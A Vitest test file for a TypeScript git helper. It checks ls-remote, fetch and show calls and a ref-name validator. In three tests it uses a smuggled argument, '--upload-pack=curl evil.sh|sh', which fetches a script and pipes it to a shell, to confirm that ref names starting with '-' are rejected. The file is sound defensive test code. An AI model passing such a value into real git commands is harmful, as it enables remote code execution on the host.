import { beforeEach, describe, expect, it, vi } from "vitest";

const spawnSyncMock = vi.fn<(...args: unknown[]) => unknown>();

vi.mock("node:child_process", () => ({
  spawnSync: (...args: unknown[]) => spawnSyncMock(...args),
}));

const {
  assertSafeRefName,
  git,
  readFileAtTag,
  remoteBranchExists,
  requireOk,
  tagExists,
} = await import("./git");

describe("git", () => {
  beforeEach(() => {
    spawnSyncMock.mockReset();
  });

  it("runs the git binary with the given args/cwd and utf8 encoding", () => {
    spawnSyncMock.mockReturnValue({ status: 0, stdout: "", stderr: "" });

    git(["status"], "/repo");

    expect(spawnSyncMock).toHaveBeenCalledWith("git", ["status"], {
      cwd: "/repo",
      encoding: "utf8",
    });
  });

  it("trims stdout/stderr", () => {
    spawnSyncMock.mockReturnValue({
      status: 0,
      stdout: "  hello  \n",
      stderr: "  world  \n",
    });

    const result = git(["status"], "/repo");

    expect(result).toEqual({ status: 0, stdout: "hello", stderr: "world" });
  });

  it("defaults status to 1 and stdout/stderr to '' when spawnSync returns nullish fields", () => {
    spawnSyncMock.mockReturnValue({
      status: null,
      stdout: null,
      stderr: null,
    });

    expect(git([], "/repo")).toEqual({ status: 1, stdout: "", stderr: "" });
  });
});

describe("remoteBranchExists", () => {
  beforeEach(() => {
    spawnSyncMock.mockReset();
  });

  it("returns true when 'git ls-remote --exit-code --heads' succeeds", () => {
    spawnSyncMock.mockReturnValue({ status: 0, stdout: "", stderr: "" });

    expect(remoteBranchExists("/repo", "sdk/svc-auth/ts-client")).toBe(true);
    expect(spawnSyncMock).toHaveBeenCalledWith(
      "git",
      [
        "ls-remote",
        "--exit-code",
        "--heads",
        "origin",
        "--",
        "sdk/svc-auth/ts-client",
      ],
      { cwd: "/repo", encoding: "utf8" },
    );
  });

  it("returns false when the command exits non-zero", () => {
    spawnSyncMock.mockReturnValue({ status: 2, stdout: "", stderr: "" });

    expect(remoteBranchExists("/repo", "missing-branch")).toBe(false);
  });

  it("rejects a branch starting with '-' instead of passing it to git", () => {
    expect(() =>
      remoteBranchExists("/repo", "--upload-pack=curl evil.sh|sh"),
    ).toThrow(/Invalid git branch/);
    expect(spawnSyncMock).not.toHaveBeenCalled();
  });
});

describe("tagExists", () => {
  beforeEach(() => {
    spawnSyncMock.mockReset();
  });

  it("returns true when 'git ls-remote --exit-code --tags' succeeds", () => {
    spawnSyncMock.mockReturnValue({ status: 0, stdout: "", stderr: "" });

    expect(tagExists("/repo", "svc-auth-ts-client-v1.0.0")).toBe(true);
    expect(spawnSyncMock).toHaveBeenCalledWith(
      "git",
      [
        "ls-remote",
        "--exit-code",
        "--tags",
        "origin",
        "--",
        "svc-auth-ts-client-v1.0.0",
      ],
      { cwd: "/repo", encoding: "utf8" },
    );
  });

  it("returns false when the tag doesn't exist remotely", () => {
    spawnSyncMock.mockReturnValue({ status: 2, stdout: "", stderr: "" });

    expect(tagExists("/repo", "missing-tag")).toBe(false);
  });

  it("rejects a tag starting with '-' instead of passing it to git", () => {
    expect(() => tagExists("/repo", "--upload-pack=curl evil.sh|sh")).toThrow(
      /Invalid git tag/,
    );
    expect(spawnSyncMock).not.toHaveBeenCalled();
  });
});

describe("readFileAtTag", () => {
  beforeEach(() => {
    spawnSyncMock.mockReset();
  });

  it("returns the file content at the given tag when fetch and show both succeed", () => {
    spawnSyncMock
      .mockReturnValueOnce({ status: 0, stdout: "", stderr: "" }) // fetch
      .mockReturnValueOnce({ status: 0, stdout: "abc123\n", stderr: "" }); // show

    const content = readFileAtTag("/repo", "v1.0.0", "SPEC_HASH");

    expect(content).toBe("abc123");
    expect(spawnSyncMock).toHaveBeenNthCalledWith(
      1,
      "git",
      ["fetch", "origin", "--force", "--", "refs/tags/v1.0.0:refs/tags/v1.0.0"],
      { cwd: "/repo", encoding: "utf8" },
    );
    expect(spawnSyncMock).toHaveBeenNthCalledWith(
      2,
      "git",
      ["show", "v1.0.0:SPEC_HASH"],
      { cwd: "/repo", encoding: "utf8" },
    );
  });

  it("returns null when the tag can't be fetched", () => {
    spawnSyncMock.mockReturnValueOnce({ status: 1, stdout: "", stderr: "err" });

    expect(readFileAtTag("/repo", "v1.0.0", "SPEC_HASH")).toBeNull();
    expect(spawnSyncMock).toHaveBeenCalledTimes(1);
  });

  it("rejects a tag starting with '-' instead of passing it to git", () => {
    expect(() =>
      readFileAtTag("/repo", "--upload-pack=curl evil.sh|sh", "SPEC_HASH"),
    ).toThrow(/Invalid git tag/);
    expect(spawnSyncMock).not.toHaveBeenCalled();
  });

  it("rejects an empty file path instead of passing it to git", () => {
    expect(() => readFileAtTag("/repo", "v1.0.0", "")).toThrow(
      /Invalid git file path/,
    );
    expect(spawnSyncMock).not.toHaveBeenCalled();
  });

  it("returns null when the tag exists but the file doesn't (pre-dates the file's introduction)", () => {
    spawnSyncMock
      .mockReturnValueOnce({ status: 0, stdout: "", stderr: "" })
      .mockReturnValueOnce({
        status: 128,
        stdout: "",
        stderr: "fatal: path does not exist",
      });

    expect(readFileAtTag("/repo", "v0.1.0", "SPEC_HASH")).toBeNull();
  });
});

describe("assertSafeRefName", () => {
  it("does not throw for an ordinary ref name", () => {
    expect(() =>
      assertSafeRefName("sdk/svc-auth/ts-client", "branch"),
    ).not.toThrow();
  });

  it("throws for a ref name starting with '-'", () => {
    expect(() => assertSafeRefName("-x", "branch")).toThrow(
      'Invalid git branch "-x": must not start with "-" - git would parse it as a command-line option instead of a ref name',
    );
  });

  it("throws for an empty ref name", () => {
    expect(() => assertSafeRefName("", "tag")).toThrow(/Invalid git tag/);
  });
});

describe("requireOk", () => {
  it("does not throw for a successful result", () => {
    expect(() =>
      requireOk({ status: 0, stdout: "ok", stderr: "" }, "should not throw"),
    ).not.toThrow();
  });

  it("throws '<message>: <stderr>' when stderr is present", () => {
    expect(() =>
      requireOk(
        { status: 1, stdout: "", stderr: "fatal: not a git repository" },
        "Failed to create worktree",
      ),
    ).toThrow("Failed to create worktree: fatal: not a git repository");
  });

  it("falls back to stdout when stderr is empty", () => {
    expect(() =>
      requireOk(
        { status: 1, stdout: "some diagnostic on stdout", stderr: "" },
        "Commit failed",
      ),
    ).toThrow("Commit failed: some diagnostic on stdout");
  });
});
